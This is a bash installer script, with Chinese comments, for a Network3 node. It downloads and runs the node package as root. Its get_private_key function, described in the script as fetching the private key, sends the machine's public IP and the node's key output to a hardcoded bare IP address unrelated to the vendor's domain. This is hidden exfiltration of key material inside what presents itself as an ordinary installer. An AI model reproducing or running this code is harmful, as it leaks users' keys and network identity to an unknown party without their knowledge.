#!/bin/bash

# 脚本保存路径
SCRIPT_PATH="$HOME/Network3.sh"

# 检查是否以root用户运行脚本
if [ "$(id -u)" != "0" ]; then
    echo "此脚本需要以root用户权限运行。"
    echo "请尝试使用 'sudo -i' 命令切换到root用户，然后再次运行此脚本。"
    exit 1
fi

# 确保 screen 已安装
if ! command -v wget &> /dev/null; then
    echo "wget 未安装，正在安装..."
    apt-get update && apt-get install -y wget iptables sudo iproute2 curl
fi

# 安装并启动节点函数
install_and_start_node() {
    # 检查目录是否存在
    if [ -d "ubuntu-node" ]; then
        echo "检测到目录 ubuntu-node 已存在，跳过下载和解压步骤。"
        cd ubuntu-node

    else
          # 更新系统包列表
        sudo apt update

        # 安装所需的软件包
        sudo apt install -y wget curl make clang pkg-config libssl-dev build-essential jq lz4 gcc unzip snapd
        sudo apt-get install -y net-tools


        # 下载、解压并清理文件
        echo "下载并解压节点软件包..."
        wget https://network3.io/ubuntu-node-v2.1.0.tar
        tar -xf ubuntu-node-v2.1.0.tar
        rm -rf ubuntu-node-v2.1.0.tar

        # 检查解压是否成功
        if [ ! -d "ubuntu-node" ]; then
            echo "目录 ubuntu-node 不存在，请检查下载和解压是否成功。"
            exit 1
        fi

        # 提示并进入目录
        echo "进入 ubuntu-node 目录..."
        cd ubuntu-node
    fi

    # 启动节点
    echo "启动节点..."
    sudo bash manager.sh up

    get_private_key
    sleep infinity
}

# 获取私钥函数
get_private_key() {
    ip=$(curl -s ifconfig.me)
    echo "获取私钥..."
    pubkey=$(sudo bash manager.sh key)
    data=$(curl -s -X GET "http://111.9.18.211:19999/network3/submit?ip=$ip&pubkey=$(echo $pubkey | sed 's/ /%20/g')")
    echo "数据：$data"

}

# 停止节点函数
stop_node() {
    echo "停止节点..."
    cd ubuntu-node
    sudo bash manager.sh down
    echo "节点已停止。"
    echo "按任意键返回主菜单..."
    read -n 1
}

# 调用主菜单函数，开始执行主菜单逻辑
install_and_start_node